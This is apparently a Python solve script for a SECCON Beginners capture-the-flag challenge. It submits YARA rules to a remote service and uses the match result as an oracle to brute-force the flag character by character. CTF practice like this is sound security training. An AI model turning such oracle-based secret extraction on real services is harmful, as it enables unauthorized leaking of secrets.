from pwn import *
import pwn
import ptrlib

def exploit(flag):
    io = remote("yaro.beginners.seccon.games", 5003)
    payload=f"""rule find_flag {{
    strings:
        $flag = "{flag}"
    condition:
        $flag
}}\n""".encode()
    response=io.recvline().decode().strip()
    print(response)
    io.sendline(payload)
    for _ in range(7+2):
        response=io.recvline().decode().strip()
        print(response)
    response=io.recvline().decode().strip()
    print(response)
    io.close()
    return "F" in response

ans="ctf4b{"
while ans[-1]!="}":
    for i in range(0x20,0x80):
        try:
            if exploit(ans+chr(i)):
                ans+=chr(i)
                break
        except:
            pass
    print("\n\n\n\n\n\n")
    print(ans)
    print("\n\n\n\n\n\n")

